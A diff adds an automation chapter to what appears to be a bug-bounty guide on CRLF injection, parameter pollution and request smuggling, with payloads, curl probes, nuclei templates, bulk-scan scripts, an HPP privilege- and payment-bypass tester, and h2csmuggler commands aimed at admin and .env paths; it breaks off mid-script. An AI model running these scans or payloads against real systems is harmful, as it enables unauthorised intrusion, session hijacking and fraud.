@@ -2053,9 +2053,2553 @@ Identify target architecture
 
 ---
 
-> **⚠️ Legal Disclaimer:** This guide is for educational purposes and authorized security testing only. Always get written permission before testing. Unauthorized security testing is illegal in most jurisdictions. The author is not responsible for misuse of this information.
+---
+
+# PART 6: AUTOMATION TECHNIQUES, SCRIPTS & TOOL DEEP DIVES
+
+> Complete automation reference — every tool, every command, every script.
+> Also covers CRLF Injection in full depth with theory, indentation rules, and attacks.
 
 ---
 
-*Guide Version: 2.0 | Covers: HPP, HRS (CL.TE, TE.CL, TE.TE, H2), All PortSwigger Labs*  
-*References: PortSwigger Research, OWASP, Real-World Bug Hunting (Peter Yaworski), Bug Bounty Bootcamp (Vickie Li)*
+## 6.0 CRLF INJECTION — Complete Theory
+
+Before automating anything, you MUST understand CRLF — it is the foundation
+of HTTP Request Smuggling, header injection, log injection, and response splitting.
+
+### What Are CR and LF?
+
+```
+CR  = Carriage Return = \r = ASCII 13 = 0x0D
+LF  = Line Feed       = \n = ASCII 10 = 0x0A
+CRLF = \r\n = the standard HTTP line terminator
+```
+
+Think of it like a typewriter:
+```
+CR  → moves the print head back to column 1   (carriage return)
+LF  → advances the paper one line down        (line feed)
+```
+
+### How HTTP Uses CRLF
+
+Every single line in an HTTP request/response is terminated by \r\n.
+The header section ends with a BLANK LINE = \r\n\r\n (two consecutive CRLFs).
+
+```
+RAW BYTES of a complete HTTP request:
+
+GET /index.html HTTP/1.1\r\n          ← Request line
+Host: example.com\r\n                  ← Header 1
+User-Agent: Mozilla/5.0\r\n           ← Header 2
+Accept: text/html\r\n                  ← Header 3
+Connection: keep-alive\r\n             ← Header 4
+\r\n                                   ← BLANK LINE = end of headers
+                                       ← Body starts here (empty for GET)
+```
+
+### CRLF Injection Definition
+
+CRLF Injection occurs when an attacker injects \r\n characters into user-
+controlled input that gets reflected into an HTTP header or response.
+
+```
+VULNERABLE server code (PHP):
+
+<?php
+$lang = $_GET['lang'];
+header("Content-Language: " . $lang);
+?>
+
+NORMAL request:
+GET /?lang=en HTTP/1.1
+→ Response header: Content-Language: en
+
+INJECTED request:
+GET /?lang=en%0d%0aSet-Cookie:%20admin=true HTTP/1.1
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+         %0d = \r (CR), %0a = \n (LF)
+
+→ Response headers become:
+Content-Language: en\r\n
+Set-Cookie: admin=true\r\n       ← INJECTED HEADER!
+```
+
+### URL Encoding Reference for CRLF
+
+```
+Character   ASCII   URL Encoded   Double Encoded
+─────────────────────────────────────────────────
+\r  (CR)    0x0D    %0D           %250D
+\n  (LF)    0x0A    %0A           %250A
+\r\n (CRLF) —       %0D%0A        %250D%250A
+
+Alternative encodings (WAF bypass):
+  %0d%0a          standard
+  %0D%0A          uppercase
+  %0d%0A          mixed case
+  %0a             LF only (works on some servers)
+  \r\n            literal (in some contexts)
+  %E5%98%8A%E5%98%8D  Unicode trick (%e5%98%8a = \n lookalike)
+  %u000d%u000a    JavaScript unicode escape
+  \u000d\u000a    Java/JSON unicode escape
+  \x0d\x0a        hex escape
+```
+
+### HTTP Header Indentation Rules (Critical for CRLF + Smuggling)
+
+This is what most guides skip. You MUST understand HTTP header formatting rules.
+
+```
+RULE 1: Each header is on its own line, terminated by \r\n
+────────────────────────────────────────────────────────────
+Content-Type: application/json\r\n
+Content-Length: 42\r\n
+Authorization: Bearer token123\r\n
+
+RULE 2: Header name and value are separated by ": " (colon + space)
+────────────────────────────────────────────────────────────
+Correct:   Content-Type: text/html\r\n
+Incorrect: Content-Type:text/html\r\n   ← no space (some servers reject)
+Incorrect: Content-Type : text/html\r\n ← space before colon (invalid)
+
+RULE 3: Header folding (obsolete but supported by some servers!)
+────────────────────────────────────────────────────────────
+A header value can span multiple lines if continuation lines
+start with SP (space) or HT (tab):
+
+Transfer-Encoding: chunked\r\n    ← main line
+ identity\r\n                      ← continuation (leading SPACE!)
+
+Some servers see:  Transfer-Encoding: chunked identity
+Some servers see:  Transfer-Encoding: chunked       ← stops at first value
+                   (and a new header "identity")
+
+THIS IS HOW TE.TE SMUGGLING WORKS!
+
+RULE 4: The blank line (double CRLF) separates headers from body
+────────────────────────────────────────────────────────────
+...last-header: value\r\n
+\r\n                           ← This blank line = \r\n\r\n total
+[body starts here]
+
+RULE 5: Chunked body encoding indentation
+────────────────────────────────────────────────────────────
+Each chunk has:
+  [hex-size]\r\n
+  [chunk-data]\r\n
+  [next hex-size]\r\n
+  [next chunk-data]\r\n
+  0\r\n                 ← terminal chunk (size = 0)
+  \r\n                  ← blank line after terminal chunk
+
+Example body "Hello World" in chunked:
+  b\r\n                 ← 0xb = 11 = len("Hello World")
+  Hello World\r\n
+  0\r\n
+  \r\n
+```
+
+### CRLF in Chunked Encoding — Indentation Explained
+
+This is the exact byte-level layout that makes CL.TE smuggling work:
+
+```
+Smuggling request body (annotated):
+
+BYTE SEQUENCE          MEANING
+───────────────────────────────────────────────────────────
+"0"                    chunk size = 0 (decimal)
+"\r\n"                 end of chunk-size line
+"\r\n"                 blank line after terminal chunk
+"G"                    ← SMUGGLED: start of "GET /admin..."
+"E"
+"T"
+" "
+"/"
+...
+
+In hex:
+30 0D 0A 0D 0A 47 45 54 20 2F ...
+│  │     │     │
+│  └─CR  └─LF  └─Start of smuggled request
+└─ ASCII '0' (chunk terminator)
+
+Why "0\r\n\r\n" and NOT just "0\r\n"?
+→ Chunked encoding REQUIRES a blank line after the terminal "0" chunk.
+  Without it, many servers will reject or hang.
+  The blank line = second \r\n AFTER the "0\r\n".
+```
+
+### CRLF Injection Attack Types
+
+**Type 1: HTTP Response Splitting**
+
+```
+Payload: /%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a...
+
+Attack injects a COMPLETE second HTTP response into the first.
+Browser sees two responses → second can be attacker-controlled content.
+
+Decoded:
+\r\n
+Content-Length: 0\r\n
+\r\n
+HTTP/1.1 200 OK\r\n        ← Second fake response!
+Content-Type: text/html\r\n
+\r\n
+<html>attacker content</html>
+```
+
+**Type 2: Header Injection**
+
+```
+Payload: ?redirect=https://safe.com%0d%0aSet-Cookie:%20admin=1
+
+Server generates:
+Location: https://safe.com\r\n
+Set-Cookie: admin=1\r\n          ← Injected!
+```
+
+**Type 3: Log Injection**
+
+```
+Request: GET /%0d%0a[INJECTED LOG LINE] HTTP/1.1
+
+Server log becomes:
+127.0.0.1 - GET /
+[INJECTED LOG LINE] HTTP/1.1
+
+Attacker can forge log entries, hide their tracks,
+or inject fake entries to frame others.
+```
+
+**Type 4: XSS via CRLF**
+
+```
+Payload: ?lang=en%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+
+Response becomes:
+HTTP/1.1 200 OK
+Content-Language: en
+Content-Type: text/html          ← Injected! Changes content type
+
+                                  ← Injected blank line (end of headers)
+<script>alert(1)</script>         ← Injected body with XSS!
+```
+
+**Type 5: CRLF → SSRF**
+
+```
+Payload in Host header:
+Host: legitimate.com%0d%0aHost:%20internal.corp.com
+
+Some servers split on \r\n in Host and route to second host:
+→ Internal SSRF!
+```
+
+**Type 6: CRLF in Transfer-Encoding (TE.TE Core)**
+
+```
+This is how TE.TE header folding works at byte level:
+
+Transfer-Encoding:\x20chunked\r\n
+\x20identity\r\n                   ← \x20 = space = header folding continuation
+
+Front-end sees:  Transfer-Encoding: chunked identity → uses chunked
+Back-end sees:   Transfer-Encoding: chunked          → uses chunked
+                 (then sees " identity" as new header → ignores TE)
+
+Result: Both process differently → TE.TE desync!
+```
+
+---
+
+## 6.1 Tool Ecosystem Overview
+
+```
+═══════════════════════════════════════════════════════════════════════
+                    COMPLETE TOOL ECOSYSTEM
+═══════════════════════════════════════════════════════════════════════
+
+  RECON                   DETECTION               EXPLOITATION
+  ─────                   ─────────               ────────────
+  Arjun                   smuggler.py             Turbo Intruder
+  Param Miner             HTTP Req Smuggler       hrs_exploit_gen.py
+  ffuf                    nuclei templates        Burp Repeater (manual)
+  gau / waybackurls       h2csmuggler             desync scripts
+  katana                  hrs_detector.py         Intruder clusterbomb
+  hakrawler               timing probes           caido workflows
+
+  CRLF SPECIFIC           SUPPORTING              PIPELINE
+  ─────────────           ──────────              ────────
+  CRLFuzz                 Burp Suite Pro          bash orchestrator
+  crlfuzz Go tool         caido                   Python async engine
+  custom curl probes      mitmproxy               Docker test labs
+  OWASP ZAP active        curl / httpx            GitHub Actions CI
+═══════════════════════════════════════════════════════════════════════
+```
+
+---
+
+## 6.2 Environment Setup — Complete
+
+```bash
+#!/bin/bash
+# setup_complete.sh — Full environment: HPP + HRS + CRLF tools
+set -e
+
+echo "[*] Setting up complete HTTP security testing environment..."
+
+# ── System packages ────────────────────────────────────────────────
+sudo apt-get update -y
+sudo apt-get install -y \
+    python3 python3-pip python3-venv \
+    golang-go git curl wget jq \
+    libssl-dev build-essential netcat-openbsd
+
+# ── Go environment ─────────────────────────────────────────────────
+export GOPATH="$HOME/go"
+export PATH="$PATH:$GOPATH/bin"
+echo 'export GOPATH="$HOME/go"' >> ~/.bashrc
+echo 'export PATH="$PATH:$GOPATH/bin"' >> ~/.bashrc
+
+# ── Go tools ──────────────────────────────────────────────────────
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+go install github.com/ffuf/ffuf/v2@latest
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+go install github.com/projectdiscovery/katana/cmd/katana@latest
+go install github.com/lc/gau/v2/cmd/gau@latest
+go install github.com/tomnomnom/waybackurls@latest
+go install github.com/tomnomnom/qsreplace@latest
+# CRLFuzz — dedicated CRLF injection scanner
+go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
+
+echo "[+] Go tools installed"
+
+# ── Python venv + packages ─────────────────────────────────────────
+python3 -m venv ~/sec-venv
+source ~/sec-venv/bin/activate
+
+pip install --upgrade pip
+pip install requests httpx[http2] h2 aiohttp colorama \
+            arjun urllib3 python-dotenv
+
+# ── Clone tool repos ───────────────────────────────────────────────
+mkdir -p ~/sec-tools
+cd ~/sec-tools
+
+# smuggler.py (HRS)
+[ -d smuggler ] || git clone https://github.com/defparam/smuggler.git
+
+# h2csmuggler (HTTP/2 HRS)
+[ -d h2csmuggler ] || git clone https://github.com/BishopFox/h2csmuggler.git
+pip install h2 hyperframe hpack
+
+# nuclei templates
+nuclei -update-templates
+
+echo "[+] All tools installed"
+echo "[+] Activate venv: source ~/sec-venv/bin/activate"
+```
+
+---
+
+## 6.3 CRLFuzz — Complete Guide
+
+CRLFuzz is the dedicated Go tool for CRLF injection scanning.
+
+### Installation
+
+```bash
+go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest
+# verify
+crlfuzz --version
+```
+
+### Full Usage Reference
+
+```bash
+# ── Basic scan (single URL) ────────────────────────────────────────
+crlfuzz -u "https://target.com/page?param=VALUE"
+
+# ── Scan with custom path list ────────────────────────────────────
+crlfuzz -u "https://target.com" \
+        -w /path/to/paths.txt
+
+# ── Scan multiple URLs from file ──────────────────────────────────
+crlfuzz -l urls.txt
+
+# ── Pipe from other tools ─────────────────────────────────────────
+cat urls.txt | crlfuzz -u -
+
+# ── Concurrency (default 25) ──────────────────────────────────────
+crlfuzz -u "https://target.com/FUZZ" -c 50
+
+# ── Silent mode (only findings) ───────────────────────────────────
+crlfuzz -u "https://target.com/FUZZ" -s
+
+# ── With proxy (route through Burp) ──────────────────────────────
+crlfuzz -u "https://target.com/FUZZ" \
+        -x http://127.0.0.1:8080
+
+# ── Custom headers (authenticated) ───────────────────────────────
+crlfuzz -u "https://target.com/FUZZ" \
+        -H "Cookie: session=abc123" \
+        -H "Authorization: Bearer TOKEN"
+
+# ── Custom method ─────────────────────────────────────────────────
+crlfuzz -u "https://target.com/FUZZ" -X POST
+
+# ── Output results to file ────────────────────────────────────────
+crlfuzz -u "https://target.com/FUZZ" -o crlf_results.txt
+
+# ── Verbose (show all requests) ───────────────────────────────────
+crlfuzz -u "https://target.com/FUZZ" -v
+
+# ── Skip SSL verification ─────────────────────────────────────────
+crlfuzz -u "https://target.com/FUZZ" -k
+
+# ── Full pipeline: discover URLs then scan for CRLF ───────────────
+gau target.com | \
+    grep -v '\.(jpg|png|css|js|gif)' | \
+    crlfuzz -u - -s -o crlf_all.txt
+```
+
+### CRLFuzz Payloads It Tests Internally
+
+CRLFuzz tries these variants for each URL:
+
+```
+%0d%0a                    standard CR+LF
+%0a                       LF only
+%0d                       CR only
+%0D%0A                    uppercase
+%0d%0a%20                 CRLF + space
+%0d%0aSet-Cookie:crlf=1   header injection test
+%23%0d%0a                 # then CRLF
+%3f%0d%0a                 ? then CRLF
+%0d%0a%09                 CRLF + tab
+\r\n                      literal (some parsers)
+\u000d\u000a              unicode
+%E5%98%8A%E5%98%8D        multi-byte trick
+```
+
+### Bulk CRLF Pipeline Script
+
+```bash
+#!/bin/bash
+# crlf_bulk_scan.sh — Full CRLF injection scanning pipeline
+# Usage: bash crlf_bulk_scan.sh target.com
+
+TARGET="$1"
+OUT="crlf_results_${TARGET}"
+mkdir -p "$OUT"
+
+echo "[*] Step 1: Collecting URLs..."
+{
+  gau "$TARGET" 2>/dev/null
+  waybackurls "$TARGET" 2>/dev/null
+} | sort -u | \
+  grep -v '\.\(jpg\|jpeg\|png\|gif\|css\|ico\|woff\|svg\|ttf\|eot\)' | \
+  tee "$OUT/all_urls.txt"
+
+echo "[+] URLs collected: $(wc -l < "$OUT/all_urls.txt")"
+
+echo "[*] Step 2: Filtering to live URLs..."
+cat "$OUT/all_urls.txt" | \
+  httpx -silent -status-code -mc 200,301,302,403 | \
+  awk '{print $1}' > "$OUT/live_urls.txt"
+
+echo "[+] Live URLs: $(wc -l < "$OUT/live_urls.txt")"
+
+echo "[*] Step 3: Running CRLFuzz..."
+crlfuzz -l "$OUT/live_urls.txt" \
+        -s \
+        -c 20 \
+        -o "$OUT/crlf_findings.txt"
+
+echo "[*] Step 4: Running custom CRLF probes..."
+while IFS= read -r url; do
+  # Test each parameter position
+  params=$(echo "$url" | grep -o '[?&][^=&]*=' | tr -d '?&=' | tr '\n' ' ')
+  for param in $params; do
+    test_url="${url/$param=*/$param=%0d%0aSet-Cookie:crlf_test=1}"
+    response=$(curl -sk -o /dev/null -w "%{http_code}:%{size_header}" \
+               -H "Cookie: session=test" \
+               --max-time 10 "$test_url")
+    echo "$response $test_url" >> "$OUT/custom_probes.txt"
+  done
+done < "$OUT/live_urls.txt"
+
+echo "[+] Done. Results in $OUT/"
+echo "[+] CRLF findings: $OUT/crlf_findings.txt"
+```
+
+---
+
+## 6.4 Manual CRLF Testing with curl
+
+curl lets you send raw CRLF bytes manually — essential for confirming findings.
+
+```bash
+# ── Basic CRLF test in URL parameter ─────────────────────────────
+curl -v "https://target.com/redirect?url=https://safe.com%0d%0aSet-Cookie:%20admin=1"
+
+# Expected: Look for "Set-Cookie: admin=1" in response headers
+
+# ── CRLF in User-Agent header ─────────────────────────────────────
+curl -v "https://target.com/" \
+     -A "Mozilla/5.0%0d%0aInjected-Header: evil"
+
+# ── CRLF header injection with full response splitting ─────────────
+# Inject a second complete HTTP response
+PAYLOAD='https://safe.com%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Injected!</h1>'
+curl -v "https://target.com/redirect?url=${PAYLOAD}"
+
+# ── CRLF in cookie value ──────────────────────────────────────────
+curl -v "https://target.com/api" \
+     -H "Cookie: session=abc%0d%0aX-Injected:%20header"
+
+# ── CRLF with newline-only (LF without CR) ────────────────────────
+curl -v "https://target.com/?lang=en%0aSet-Cookie:%20test=1"
+
+# ── Test CRLF in POST body that gets reflected to headers ─────────
+curl -v -X POST "https://target.com/api/setlang" \
+     -d "lang=en%0d%0aX-Injected:%20evil" \
+     -H "Content-Type: application/x-www-form-urlencoded"
+
+# ── Raw socket CRLF injection (bypasses curl encoding) ────────────
+# Use printf to send literal bytes
+printf 'GET /?param=value\r\nX-Injected: header\r\n\r\n' | \
+  openssl s_client -connect target.com:443 -quiet 2>/dev/null
+
+# ── Check response headers for injection success ──────────────────
+curl -sI "https://target.com/?lang=en%0d%0aSet-Cookie:%20injected=1" | \
+  grep -i "set-cookie\|injected"
+```
+
+---
+
+## 6.5 CRLF Nuclei Templates
+
+```yaml
+# crlf-header-injection.yaml
+id: crlf-header-injection
+
+info:
+  name: CRLF Header Injection
+  author: security-researcher
+  severity: medium
+  description: |
+    Detects CRLF injection in HTTP parameters by checking if injected
+    headers appear in the response. Tests both %0d%0a and %0a variants.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/CRLF_Injection
+  tags: crlf,injection,header
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?{{params}}=test%0d%0aX-Crlf-Test:%20crlfuzz"
+      - "{{BaseURL}}/?{{params}}=test%0aX-Crlf-Test:%20crlfuzz"
+      - "{{BaseURL}}/redirect?url=https://safe.com%0d%0aX-Crlf-Test:%20crlfuzz"
+      - "{{BaseURL}}/lang?lang=en%0d%0aX-Crlf-Test:%20crlfuzz"
+
+    payloads:
+      params:
+        - redirect
+        - url
+        - lang
+        - next
+        - return
+        - callback
+        - ref
+        - page
+        - path
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "X-Crlf-Test:\\s*crlfuzz"
+        name: injected-header-found
+
+    extractors:
+      - type: regex
+        part: header
+        name: injected-headers
+        regex:
+          - "X-Crlf-Test:.*"
+```
+
+```yaml
+# crlf-cookie-injection.yaml
+id: crlf-cookie-injection
+
+info:
+  name: CRLF Injection leading to Cookie Setting
+  author: security-researcher
+  severity: high
+  description: |
+    Detects CRLF injection that allows setting arbitrary cookies,
+    potentially enabling session fixation or privilege escalation.
+  tags: crlf,cookie,session-fixation
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?{{params}}=value%0d%0aSet-Cookie:%20crlf_test=1;%20Path=/"
+
+    payloads:
+      params:
+        - redirect
+        - url
+        - next
+        - return_url
+        - lang
+        - ref
+        - page
+        - location
+        - dest
+        - destination
+
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "Set-Cookie:.*crlf_test=1"
+        name: cookie-injection-confirmed
+```
+
+---
+
+## 6.6 Arjun — Complete Guide
+
+### Installation
+
+```bash
+pip install arjun
+# OR
+git clone https://github.com/s0md3v/Arjun.git && cd Arjun && pip install .
+```
+
+### Full Command Reference
+
+```bash
+# ── GET parameter discovery ────────────────────────────────────────
+arjun -u "https://target.com/search"
+
+# ── POST parameter discovery ──────────────────────────────────────
+arjun -u "https://target.com/login" -m POST
+
+# ── JSON parameter discovery ──────────────────────────────────────
+arjun -u "https://target.com/api" -m JSON
+
+# ── XML body parameters ───────────────────────────────────────────
+arjun -u "https://target.com/api" -m XML
+
+# ── Authenticated request ─────────────────────────────────────────
+arjun -u "https://target.com/api" \
+      -m GET \
+      --headers "Cookie: session=abc123" \
+      --headers "Authorization: Bearer TOKEN"
+
+# ── Custom wordlist ───────────────────────────────────────────────
+arjun -u "https://target.com/api" \
+      -w ~/wordlists/params.txt
+
+# ── Multiple URLs from file ───────────────────────────────────────
+arjun -i urls.txt -m GET -o results.json
+
+# ── Increase thread count ─────────────────────────────────────────
+arjun -u "https://target.com/" -t 20
+
+# ── Stable mode (slower, more accurate) ───────────────────────────
+arjun -u "https://target.com/" --stable
+
+# ── Through Burp proxy ────────────────────────────────────────────
+arjun -u "https://target.com/" \
+      --proxies "http://127.0.0.1:8080"
+
+# ── Quiet (no banner, only results) ──────────────────────────────
+arjun -u "https://target.com/" -q
+
+# ── Chunk size (params per request, default 500) ─────────────────
+arjun -u "https://target.com/" --chunk-size 250
+
+# ── Passive (just report, don't send requests) ────────────────────
+# Useful for checking discovered params against known lists
+arjun -u "https://target.com/" --passive
+
+# ── Delay between requests (rate limiting) ────────────────────────
+arjun -u "https://target.com/" --stable --delay 500
+```
+
+### Arjun → HPP Pipeline Script
+
+```python
+#!/usr/bin/env python3
+# arjun_to_hpp.py — Take Arjun output, generate + test HPP payloads
+
+import json
+import sys
+import requests
+import urllib3
+urllib3.disable_warnings()
+
+HPP_ATTACK_MAP = {
+    "role":       (["user", "admin"],          "Privilege Escalation"),
+    "admin":      (["0", "1"],                 "Admin Flag Bypass"),
+    "debug":      (["false", "true"],          "Debug Enable"),
+    "status":     (["inactive", "active"],     "Status Manipulation"),
+    "verified":   (["false", "true"],          "Verification Bypass"),
+    "price":      (["100", "0"],               "Price Manipulation"),
+    "amount":     (["100", "0"],               "Amount Bypass"),
+    "discount":   (["0", "100"],               "Discount Abuse"),
+    "redirect":   (["https://safe.com",
+                    "https://evil.com"],        "Open Redirect"),
+    "email":      (["victim@mail.com",
+                    "attacker@evil.com"],       "Email Injection"),
+    "type":       (["user", "admin"],          "Type Escalation"),
+    "confirmed":  (["false", "true"],          "Confirmation Bypass"),
+    "approved":   (["0", "1"],                 "Approval Bypass"),
+    "paid":       (["false", "true"],          "Payment Bypass"),
+    "scope":      (["read", "write:admin"],    "Scope Escalation"),
+}
+
+def baseline(url, param, val, session):
+    try:
+        r = session.get(url, params={param: val},
+                        timeout=10, verify=False)
+        return r.status_code, len(r.text), r.text[:300]
+    except Exception as e:
+        return None, None, str(e)
+
+def polluted(url, param, v1, v2, session):
+    # Build URL manually to force duplicate params
+    test_url = f"{url}?{param}={v1}&{param}={v2}"
+    try:
+        r = session.get(test_url, timeout=10, verify=False)
+        return r.status_code, len(r.text), r.text[:300]
+    except Exception as e:
+        return None, None, str(e)
+
+def run(arjun_file, cookies=None):
+    session = requests.Session()
+    if cookies:
+        for k, v in (c.split("=", 1) for c in cookies.split(";")):
+            session.cookies.set(k.strip(), v.strip())
+
+    with open(arjun_file) as f:
+        data = json.load(f)
+
+    findings = []
+
+    for url, info in data.items():
+        params = info.get("params", [])
+        print(f"\n[Target] {url}")
+        print(f"[Params] {params}")
+
+        for param in params:
+            if param not in HPP_ATTACK_MAP:
+                continue
+            values, attack = HPP_ATTACK_MAP[param]
+            v1, v2 = values[0], values[1]
+
+            b_code, b_len, _ = baseline(url, param, v1, session)
+            p_code, p_len, p_body = polluted(url, param, v1, v2, session)
+
+            changed = (b_code != p_code) or (abs((b_len or 0) - (p_len or 0)) > 50)
+
+            if changed:
+                print(f"  [!!!] HPP CHANGE on param '{param}' ({attack})")
+                print(f"        Baseline: {b_code} / {b_len}b")
+                print(f"        Polluted: {p_code} / {p_len}b")
+                findings.append({
+                    "url": url,
+                    "param": param,
+                    "attack": attack,
+                    "baseline": {"code": b_code, "len": b_len},
+                    "polluted": {"code": p_code, "len": p_len},
+                    "snippet": p_body,
+                })
+
+    print(f"\n[Summary] {len(findings)} HPP findings")
+    with open("hpp_findings.json", "w") as f:
+        json.dump(findings, f, indent=2)
+    print("[+] Saved: hpp_findings.json")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print("Usage: python3 arjun_to_hpp.py arjun_results.json [cookies]")
+        sys.exit(1)
+    cookies = sys.argv[2] if len(sys.argv) > 2 else None
+    run(sys.argv[1], cookies)
+```
+
+---
+
+## 6.7 smuggler.py — Complete Guide
+
+### Installation & Structure
+
+```bash
+git clone https://github.com/defparam/smuggler.git
+cd smuggler
+# No extra dependencies beyond Python 3 + socket
+# File structure:
+# smuggler/
+# ├── smuggler.py        ← main script
+# ├── payloads/          ← payload text files
+# │   ├── CLTE.txt       ← CL.TE probes
+# │   ├── TECL.txt       ← TE.CL probes
+# │   └── TETE.txt       ← TE.TE obfuscation probes
+# └── README.md
+```
+
+### Full Command Reference
+
+```bash
+# ── Basic scan (auto-detects type) ────────────────────────────────
+python3 smuggler.py -u "https://target.com/"
+
+# ── Verbose (show each probe) ─────────────────────────────────────
+python3 smuggler.py -u "https://target.com/" -v
+
+# ── Specify type only ─────────────────────────────────────────────
+python3 smuggler.py -u "https://target.com/" --type CL.TE
+python3 smuggler.py -u "https://target.com/" --type TE.CL
+python3 smuggler.py -u "https://target.com/" --type TE.TE
+
+# ── Custom timeout per probe ──────────────────────────────────────
+python3 smuggler.py -u "https://target.com/" -t 15
+
+# ── Custom HTTP method ────────────────────────────────────────────
+python3 smuggler.py -u "https://target.com/" -m POST
+
+# ── Add extra headers ─────────────────────────────────────────────
+python3 smuggler.py -u "https://target.com/" \
+    -H "Cookie: session=abc123" \
+    -H "Authorization: Bearer TOKEN"
+
+# ── Output to file ────────────────────────────────────────────────
+python3 smuggler.py -u "https://target.com/" \
+    -o smuggler_results.txt
+
+# ── Pipe in URLs ──────────────────────────────────────────────────
+cat targets.txt | while read url; do
+    python3 smuggler.py -u "$url" -t 12 \
+        -o "results/$(echo $url | md5sum | cut -c1-8).txt"
+    sleep 3
+done
+
+# ── Test with specific payload file ───────────────────────────────
+python3 smuggler.py -u "https://target.com/" \
+    -x payloads/CLTE.txt
+
+# ── All obfuscation variants for TE.TE ───────────────────────────
+python3 smuggler.py -u "https://target.com/" --type TE.TE -v
+# This cycles through all variants in payloads/TETE.txt:
+# Transfer-Encoding: xchunked
+# Transfer-Encoding: x-chunked
+# Transfer-Encoding: chunked, dav
+# Transfer-Encoding: CHUNKED
+# etc.
+```
+
+### Understanding smuggler.py Output
+
+```
+[INFO] Scanning https://target.com/
+[INFO] Trying CLTE...          ← Starting CL.TE probe
+[!] Timed out on: CLTE-0       ← Timing anomaly on probe variant 0
+[!!!] Potential CLTE!           ← VULNERABILITY INDICATOR
+[INFO] Trying TECL...          ← Starting TE.CL probe
+[INFO] TECL-0: 200             ← Normal response, no anomaly
+[INFO] Trying TETE...          ← Starting TE.TE probe
+[!] Timed out on: TETE-3       ← TE.TE variant 3 caused timeout
+[!!!] Potential TETE!           ← TE.TE VULNERABILITY INDICATOR
+```
+
+### Custom Bulk Scan with Triage
+
+```bash
+#!/bin/bash
+# smuggler_bulk.sh — Scan targets, triage results, generate PoC
+TARGET_FILE="$1"
+OUT="smuggler_$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$OUT"/{raw,vulnerable,poc}
+
+while IFS= read -r url; do
+    [ -z "$url" ] && continue
+    slug=$(echo "$url" | md5sum | cut -c1-8)
+    out_file="$OUT/raw/${slug}.txt"
+
+    echo "[*] Scanning: $url"
+    timeout 120 python3 ~/sec-tools/smuggler/smuggler.py \
+        -u "$url" -t 12 -v \
+        -o "$out_file" 2>&1
+
+    # Triage
+    if grep -qi "Potential\|VULNERABLE\|!!!" "$out_file" 2>/dev/null; then
+        echo "[!!!] VULNERABLE: $url"
+        cp "$out_file" "$OUT/vulnerable/${slug}_VULN.txt"
+        echo "$url" >> "$OUT/CONFIRMED_VULNERABLE.txt"
+
+        # Generate exploit PoC
+        TYPE=$(grep -oi "CL\.TE\|TE\.CL\|TE\.TE" "$out_file" | head -1)
+        cat > "$OUT/poc/${slug}_poc.md" << EOF
+# HRS PoC — $url
+## Type: $TYPE
+## Detected: $(date)
+
+### Timing Probe (sent to confirm)
+\`\`\`http
+POST / HTTP/1.1
+Host: $(echo "$url" | sed 's|https\?://||' | cut -d/ -f1)
+Content-Length: 4
+Transfer-Encoding: chunked
+
+1
+A
+X
+\`\`\`
+
+### Next Steps
+1. Open Burp Suite → Repeater
+2. Paste above request (HTTP/1.1 mode, disable auto-CL)
+3. Confirm with differential response method
+4. Build exploit chain
+EOF
+    fi
+
+    sleep 5
+done < "$TARGET_FILE"
+
+echo ""
+echo "[+] Scan complete"
+echo "[+] Vulnerable targets: $(wc -l < "$OUT/CONFIRMED_VULNERABLE.txt" 2>/dev/null || echo 0)"
+echo "[+] Output: $OUT/"
+```
+
+---
+
+## 6.8 h2csmuggler — Complete Guide
+
+### Installation
+
+```bash
+git clone https://github.com/BishopFox/h2csmuggler.git
+cd h2csmuggler
+pip install h2 hyperframe hpack
+python3 h2csmuggler.py --help
+```
+
+### Full Command Reference
+
+```bash
+# ── Test if h2c upgrade is accepted ──────────────────────────────
+python3 h2csmuggler.py --test "https://target.com/"
+# Output:
+# [INFO] Testing h2c on target.com
+# [PASS] h2c stream ACCEPTED — target may be vulnerable!
+# [FAIL] h2c stream rejected — not vulnerable via h2c
+
+# ── Smuggle GET request ───────────────────────────────────────────
+python3 h2csmuggler.py \
+    --smuggle-through "https://target.com/" \
+    --target "https://target.com/admin" \
+    -X GET
+
+# ── Smuggle POST with body ────────────────────────────────────────
+python3 h2csmuggler.py \
+    --smuggle-through "https://target.com/" \
+    --target "https://target.com/api/internal" \
+    -X POST \
+    -d "action=getUsers" \
+    -H "Content-Type: application/x-www-form-urlencoded"
+
+# ── Smuggle with custom headers ────────────────────────────────────
+python3 h2csmuggler.py \
+    --smuggle-through "https://target.com/" \
+    --target "https://target.com/admin" \
+    -H "X-Forwarded-For: 127.0.0.1" \
+    -H "X-Real-IP: 127.0.0.1" \
+    -H "Host: localhost"
+
+# ── Verbose mode (show H2 frames) ────────────────────────────────
+python3 h2csmuggler.py \
+    --smuggle-through "https://target.com/" \
+    --target "https://target.com/admin" \
+    -v
+
+# ── Through Burp proxy ────────────────────────────────────────────
+python3 h2csmuggler.py \
+    --smuggle-through "https://target.com/" \
+    --target "https://target.com/admin" \
+    --proxy "http://127.0.0.1:8080"
+
+# ── Wordlist of paths to smuggle to ───────────────────────────────
+python3 h2csmuggler.py \
+    --smuggle-through "https://target.com/" \
+    --wordlist ~/wordlists/admin_paths.txt
+
+# ── Bulk test multiple targets ────────────────────────────────────
+while read url; do
+    echo "Testing: $url"
+    python3 h2csmuggler.py --test "$url" 2>/dev/null
+    sleep 2
+done < targets.txt
+
+# ── Test common internal endpoints after h2c confirmed ────────────
+ENDPOINTS=("/admin" "/.env" "/api/internal" "/actuator" "/metrics")
+TARGET="https://target.com"
+for ep in "${ENDPOINTS[@]}"; do
+    echo "Smuggling to: $ep"
